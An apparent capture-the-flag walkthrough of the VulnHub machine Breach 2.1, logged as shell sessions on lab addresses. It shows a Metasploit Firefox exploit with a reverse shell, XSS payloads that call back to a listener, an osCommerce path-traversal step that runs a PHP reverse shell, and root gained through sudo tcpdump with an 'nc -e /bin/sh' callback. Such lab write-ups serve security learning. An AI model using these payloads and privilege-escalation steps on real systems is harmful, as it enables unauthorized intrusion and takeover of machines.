[*] Started reverse TCP handler on 192.168.110.100:4444
[*] Using URL: http://192.168.110.100:8080/QANZBMp8oRiwrZQ
[*] Server started.
[*] 192.168.110.100  firefox_proto_crmfrequest - Gathering target information for 192.168.110.100
[*] 192.168.110.100  firefox_proto_crmfrequest - Sending HTML response to 192.168.110.100
[!] 192.168.110.100  firefox_proto_crmfrequest - Exploit requirement(s) not met: ua_ver. For more info: http://r-7.co/PVbcgx
```

- And tried different xss shell from github. Seems none of them work so far, only one that haven't try is an Windows version tool, called xss-shell/xss-tunnel.
- Keep researching if command execution is possible by javascript, and the conslusion is that it's possible with node.js background js running, but not possible with traditional frontend browser js.
- With javascript tool like JSshell.py, we can only execute easy and limited front end code:
```bash
└─$ python3 jsh.py -g -s 192.168.110.100 -p 9002
    __
  |(_  _ |_  _  |  |
\_|__)_> | |(/_ |  |
                      v3.1

Payloads:
 - SVG: <svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//192.168.110.100:9002"},1010)>
 - SCRIPT: <script>setInterval(function(){with(document)body.appendChild(createElement("script")).src="//192.168.110.100:9002"},1010)</script>
 - IMG: <img src=x onerror=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//192.168.110.100:9002"},1010)>
 - BODY: <body onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//192.168.110.100:9002"}></body>

Listening on [any] 9002 for incoming JS shell ...

>>> help
JSshell uses javascript code as shell commands. Also supports some commands:
help                  This help
domain                The source domain
pwd                   The source path
cookie                The user cookie
snippet               Write a snippet of code
exit, quit            Exit the JS shell
```

- If we are going to use the msf exploit, there has to be a very old version of firefox, v15. But interesting thing is, I'm the one using firefox to access the webpage right now, does it affect the exploit?
- But after I put in hook, Beef-XSS will get two online browsers, one is with ip address of kali, one is with ip address of Breach2.1
- The one with kali shows that web browser version is 78.0
![[Pasted image 20210506164237.png]]
- The one with Breach2.1 shows that web browser version is 15
![[Pasted image 20210506164328.png]]

- OK, we are finally get on to the system by msf, so we will have to use the hook from ip address of Breach2.1, which FF version is 15 can trigger by this exploit.
```bash
┌──(htb㉿kali)-[/opt/JSshell]
└─$ msfconsole
...[snip]...
msf6 > use exploit/multi/browser/firefox_proto_crmfrequest
[*] No payload configured, defaulting to generic/shell_reverse_tcp
msf6 exploit(multi/browser/firefox_proto_crmfrequest) > set lhost 192.168.110.100
lhost => 192.168.110.100
msf6 exploit(multi/browser/firefox_proto_crmfrequest) > set srvhost 192.168.110.100
srvhost => 192.168.110.100
msf6 exploit(multi/browser/firefox_proto_crmfrequest) > set lport 9999
lport => 9999
msf6 exploit(multi/browser/firefox_proto_crmfrequest) > set payload firefox/shell_reverse_tcp
payload => firefox/shell_reverse_tcp
msf6 exploit(multi/browser/firefox_proto_crmfrequest) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.110.100:9999
msf6 exploit(multi/browser/firefox_proto_crmfrequest) > [*] Using URL: http://192.168.110.100:8080/2sAYSHVCr
[*] Server started.
[*] 192.168.110.151  firefox_proto_crmfrequest - Gathering target information for 192.168.110.151
[*] 192.168.110.151  firefox_proto_crmfrequest - Sending HTML response to 192.168.110.151
[*] 192.168.110.151  firefox_proto_crmfrequest - Sending HTML
[*] 192.168.110.151  firefox_proto_crmfrequest - Sending the malicious addon
[*] Command shell session 1 opened (192.168.110.100:9999 -> 192.168.110.151:45540) at 2021-05-06 17:01:37 +1000
msf6 exploit(multi/browser/firefox_proto_crmfrequest) > sessions

Active sessions
===============

  Id  Name  Type                   Information  Connection
  --  ----  ----                   -----------  ----------
  1         shell firefox/firefox               192.168.110.100:9999 -> 192.168.110.151:45540 (192.168.110.151)
  
msf6 exploit(multi/browser/firefox_proto_crmfrequest) > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > set lport 4444
lport => 4444
msf6 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to a
                                       uto detect).
   LPORT    4444             yes       Port for payload to connect to.
   SESSION  1                yes       The session to run this module on.

msf6 post(multi/manage/shell_to_meterpreter) > run

[!] SESSION may not be compatible with this module.
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.110.100:4444
[*] Sending stage (980808 bytes) to 192.168.110.151
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > id
[*] exec: id

uid=1000(htb) gid=1000(htb) groups=1000(htb),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),114(bluetooth),123(scanner),127(kaboxer),128(wireshark)

msf6 post(multi/manage/shell_to_meterpreter) > sessions
[*] Meterpreter session 2 opened (192.168.110.100:4444 -> 192.168.110.151:43964) at 2021-05-06 17:03:23 +1000

Active sessions
===============

  Id  Name  Type                   Information                             Connection
  --  ----  ----                   -----------                             ----------
  1         shell firefox/firefox                                          192.168.110.100:9999 -> 192.168.110.151
                                                                           :45540 (192.168.110.151)
  2         meterpreter x86/linux  peter @ breach2 (uid=1000, gid=1000, e  192.168.110.100:4444 -> 192.168.110.151
                                   uid=1000, egid=1000) @ 192.168.110.151  :43964 (192.168.110.151)
								   
msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > id
[-] Unknown command: id.
meterpreter > sysinfo
Computer     : 192.168.110.151
OS           : Debian 8.5 (Linux 3.16.0-4-amd64)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > shell
Process 1729 created.
Channel 1 created.



id
uid=1000(peter) gid=1000(peter) groups=1000(peter),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(scanner),115(bluetooth),1003(fishermen)
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")'
peter@breach2:~$ export TERM=xterm
export TERM=xterm
peter@breach2:~$ pwd
pwd
/home/peter
```

- Since we were kick out by ssh when login, it's highly possible that there's force command option enough on sshd, which will do one command/script execution, then end this session. We can confirm this by check sshd_config.
```bash
peter@breach2:~$ grep -i forcecommand /etc/ssh/sshd_config
grep -i forcecommand /etc/ssh/sshd_config
ForceCommand /usr/bin/startme
peter@breach2:~$ cat /usr/bin/startme
cat /usr/bin/startme
#!/bin/bash

sudo /etc/init.d/apache2 start &> /dev/null

peter@breach2:~$ grep bash /etc/passwd
grep bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
peter:x:1000:1000:peter,,,:/home/peter:/bin/bash
milton:x:1002:1002::/home/milton:/bin/bash
```

- So this is what happens. To get rid of msf, we have to go back to ssh, and to keep us in the ssh bash session, we need to overwrite .bashrc.
```bash
peter@breach2:~$ echo 'exec /bin/bash' > .bashrc
echo 'exec /bin/bash' > .bashrc
```

```bash
┌──(htb㉿kali)-[~]
└─$ ssh peter@192.168.110.151 -p 65535
#############################################################################
#                  Welcome to Initech Cyber Consulting, LLC                 #
#                 All connections are monitored and recorded                #
#                     Unauthorized access is encouraged                     #
#             Peter, if that's you - the password is in the source.         #
#          Also, stop checking your blog all day and enjoy your vacation!   #
#############################################################################
peter@192.168.110.151's password:
id
^C
bash-4.3$ ^C
bash-4.3$ id
uid=1000(peter) gid=1000(peter) groups=1000(peter),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(scanner),115(bluetooth),1003(fishermen)
bash-4.3$
```

- Now we can have a full function shell......
- We found firefox.sh from peter's home directory
```bash
bash-4.3$ cat firefox.sh
#!/bin/bash

xvfb-run --auto-servernum --server-num=1 /opt/firefox/firefox http://192.168.110.151/blog/members.html


bash-4.3$ crontab -l
...[snip]...
*/4 * * * * cd /home/peter && ./firefox.sh
```

- And a crontab is running to execute it to access the members.html, which is why we will get an FF version 15.




# Privesc
## peas
- We have port 2323 listen on localhost.
- unfortunately there's no sudo group of 3 users.
```bash
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:57384           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                    <<<<<< mysql
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN      -                    <<<<<<<<<<<< What is it?
tcp6       0      0 :::111                  :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::41268                :::*                    LISTEN      -

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(peter) gid=1000(peter) groups=1000(peter),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),111(scanner),115(bluetooth),1003(fishermen)
uid=1001(blumbergh) gid=1001(blumbergh) groups=1001(blumbergh),1004(fin)
uid=1002(milton) gid=1002(milton) groups=1002(milton)
```

## Port 2323
```bash
bash-4.3$ nc -v localhost 2323
localhost [127.0.0.1] 2323 (initech) open
29 45'46" N 95 22'59" W
���� ��#��'
```

- We have some weird coordinates. And Google Maps says it is a place in Houston city called “Houston Police Memorial”.
![[Pasted image 20210506174456.png]]

- OK, new trick to learn, netcat is not all powerful, since there's some weird code from the output, we should always try other tools like telnet.
```bash
bash-4.3$ telnet localhost 2323
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
29 45'46" N 95 22'59" W
breach2 login:
```

- We have a login prompt from telnet connection, but it was destroyed by netcat somehow.
```bash
bash-4.3$ telnet localhost 2323
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
29 45'46" N 95 22'59" W
breach2 login: Connection closed by foreign host.
bash-4.3$ telnet localhost 2323
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
29 45'46" N 95 22'59" W
breach2 login: houston
Password: [houston]

Login incorrect
breach2 login: milton
Password: [houston]

Login incorrect
breach2 login: bill
Password: [houston]

Login incorrect
breach2 login: milton
Password: [Houston]
Last login: Wed Jul 20 21:04:18 EDT 2016 from localhost on pts/0
Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64
29 45'46" N 95 22'59" W
3
2
1
Whose stapler is it?^C
Connection closed by foreign host.
```

- This is super weird, if the attacker don't know about the Houston story or joke, this password is going to be tried all life time.
- And this 3, 2, 1 stuff do looks like it's a script called upon a sleep() function. And how the hell that I know what is the stapler riddle...........
```bash
bash-4.3$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/games
You have new mail in /var/mail/peter
bash-4.3$ grep -r 'stapler' /usr/local/bin
/usr/local/bin/cd.py:   question = raw_input("Whose stapler is it?")

bash-4.3$ ls -al /usr/local/bin/cd.py
-rwxr-xr-x 1 milton milton 380 Jun 29  2016 /usr/local/bin/cd.py

bash-4.3$ cat /usr/local/bin/cd.py
#!/usr/bin/python

import signal
import time
import os

s = signal.signal(signal.SIGINT, signal.SIG_IGN)

countdown=3

while countdown >0:
        time.sleep(1)
        print(countdown)
        countdown -=1
if countdown <1:
        question = raw_input("Whose stapler is it?")
if question == "mine":
        os.system("echo 'Woot!'")
else:

        os.system("kill -9 %d"%(os.getppid()))
        signal.signal(signal.SIGINT, s)
```

- Sometimes it's very good idea to go search for the script location.
- I guess the word `echo` is  my way to get another reverse shell of user milton, but it's not, hmmm, I don't know why the script did not execute my 'echo' from /dev/shm, even after I export it on top of the $PATH. But seems like after os.system() called echo, the system give me the milton shell directly.
```bash
bash-4.3$ telnet localhost 2323
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
29 45'46" N 95 22'59" W
breach2 login: milton
Password:
Last login: Wed Apr 28 23:20:52 EDT 2021 from localhost on pts/0
Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64
29 45'46" N 95 22'59" W
3
2
1
Whose stapler is it?mine
Woot!
milton@breach2:~$ id
uid=1002(milton) gid=1002(milton) groups=1002(milton)
milton@breach2:~$
```

## User milton
- Always go through the files.................we have something from .profile, which I would never check before................
```bash
milton@breach2:~$ cat .profile
# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
        . "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi

python /usr/local/bin/cd.py
sudo /etc/init.d/nginx start &> /dev/null

sudo() {
        echo "Sorry, user milton may not run sudo on breach2."
}
readonly -f sudo
```

- We have a sudo function, and which tell us the infor should not tell by this definition...... so user milton can never run sudo, due to this setup..........But good news is we seems to have nginx running. And this can be confirmed by netstat.
```bash
milton@breach2:~$ netstat -anl
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:57384           0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN
tcp        0      0 192.168.110.151:65535   192.168.110.100:51172   ESTABLISHED
tcp        0      0 127.0.0.1:2323          127.0.0.1:57977         ESTABLISHED
tcp        0      0 127.0.0.1:57977         127.0.0.1:2323          ESTABLISHED
...[snip]...
```

- Port 8888 seems new.
![[Pasted image 20210506182319.png]]
- Now we finally have the oscommerce come to us. There's an exploit existing from our previous investigation.
![[Pasted image 20210506182550.png]]
![[Pasted image 20210506183001.png]]
- It says the exploit should be like this:
````html
http://www.example.com/admin/includes/applications/services/pages/uninstall.php?module=../../../../../../../../cmd
````
- Since we are already on this system, makes we much easier to utilize this exploit. We can test it by making a file.
```bash
milton@breach2:~$ echo "<?php phpinfo() ?>" > /tmp/hello.php
```
- Then we can see this page from web browser
![[Pasted image 20210506184216.png]]
- The link part can only be `hello` but not `hello.php`.
- Since the nginx is run by sudo, and `ps aux` along with this `/etc/init.d/nginx` file permission showed me that it owns by root, so I'm expecting that my php reverse shell get me to user root.
```bash
...[download & modify php revese shell]...
```
![[Pasted image 20210506184900.png]]
```bash
┌──(htb㉿kali)-[~]
└─$ bash
┌──(htb㉿kali)-[~]
└─$ nc -lvnp 9004
listening on [any] 9004 ...
connect to [192.168.110.100] from (UNKNOWN) [192.168.110.151] 53397
Linux breach2 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64 GNU/Linux
 00:02:50 up  2:15,  2 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
peter    pts/1    192.168.110.100  22:34    3.00s  5.55s  0.08s telnet localhost 2323
milton   pts/0    localhost        23:24    3.00s  0.06s  0.06s -bash
uid=1001(blumbergh) gid=1001(blumbergh) groups=1001(blumbergh),1004(fin)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
blumbergh@breach2:/$ ^Z
[1]+  Stopped                 nc -lvnp 9004
┌──(htb㉿kali)-[~]
└─$ stty raw -echo
┌──(htb㉿kali)-[~]
nc -lvnp 9004

blumbergh@breach2:/$ export TERM=xterm
blumbergh@breach2:/$ stty rows 96 cols 116
blumbergh@breach2:/$ pwd
/
blumbergh@breach2:/$ cd ~
bash: cd: /home/blumbergh: No such file or directory
blumbergh@breach2:/$ cd /home
blumbergh@breach2:/home$ ls
bill  milton  peter
blumbergh@breach2:/home$ cd bill
blumbergh@breach2:/home/bill$ ls -al
total 8
drwxr-xr-x 2 blumbergh blumbergh 4096 Jun 19  2016 .
drwxr-xr-x 5 root      root      4096 Jun 19  2016 ..
```

- Nope, I'm still not root................

## User Bill Blumbergh
- We have sudo now, but with tcpdump...
```bash
blumbergh@breach2:/home/bill$ sudo -l
Matching Defaults entries for blumbergh on breach2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User blumbergh may run the following commands on breach2:
    (root) NOPASSWD: /usr/sbin/tcpdump
blumbergh@breach2:/home/bill$ crontab -l
no crontab for blumbergh
```
![[Pasted image 20210506185522.png]]

- This is working, but we need to modify the command.
```bash
blumbergh@breach2:/home/bill$ echo 'nc -e /bin/sh 192.168.110.151 9001' > /tmp/test
blumbergh@breach2:/home/bill$ chmod +x /tmp/test
blumbergh@breach2:/home/bill$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/test -Z root
dropped privs to root
tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
```

```bash
milton@breach2:~$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.110.151] from (UNKNOWN) [192.168.110.151] 50703
id
uid=0(root) gid=0(root) groups=0(root)
ls -al ~
total 60
drwx------  7 root root 4096 Jul 20  2016 .
drwxr-xr-x 22 root root 4096 Jun 20  2016 ..
-rw-------  1 root root    0 Jun 18  2016 .Xauthority
drwx------  2 root root 4096 Jun 21  2016 .aptitude
-rw-------  1 root root   49 Jul 20  2016 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  2 root root 4096 Jun 19  2016 .cache
drwx------  3 root root 4096 Jun 19  2016 .config
-rw-r--r--  1 root root 5074 Jun 22  2016 .flag.py
drwx------  4 root root 4096 Jun 19  2016 .mozilla
-rw-------  1 root root  958 Jun 21  2016 .mysql_history
-rw-------  1 root root   44 Jul 20  2016 .nano_history
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r--r--  1 root root   66 Jun 16  2016 .selected_editor
drwx------  2 root root 4096 Jun 19  2016 .ssh
cat /root/.flag.py
chmod +x ~/.flag.py

python ~/.flag.py


#========================================================================================#
# ___                                               ___                                  #
#(   )                                             (   )                                 #
# | |.-.    ___ .-.      .--.     .---.    .--.     | | .-.       .--.             .-.   #
# | /   \  (   )   \    /    \   / .-, \  /    \    | |/   \     ;  _  \         /    \  #
# |  .-. |  | ' .-. ;  |  .-. ; (__) ; | |  .-. ;   |  .-. .    (___)` |        |  .-. ; #
# | |  | |  |  / (___) |  | | |   .'`  | |  |(___)  | |  | |         ' '        | |  | | #
# | |  | |  | |        |  |/  |  / .'| | |  |       | |  | |        / /         | |  | | #
# | |  | |  | |        |  ' _.' | /  | | |  | ___   | |  | |       / /          | |  | | #
# | '  | |  | |        |  .'.-. ; |  ; | |  '(   )  | |  | |      / /      .-.  | '  | | #
# ' `-' ;   | |        '  `-' / ' `-'  | '  `-' |   | |  | |     / '____  (   ) '  `-' / #
#  `.__.   (___)        `.__.'  `.__.'_.  `.__,'   (___)(___)   (_______)  `-'   `.__,'  #
#                                                                                        #
#========================================================================================#


Congratulations on reaching the end. I have learned a ton putting together these challenges and I hope you enjoyed it and perhaps learned something new. Stay tuned for the final in the series, Breach 3.0

Shout-out to sizzop, knightmare and rastamouse for testing and g0tmi1k for hosting and maintaining #vulnhub.

-mrb3n
```


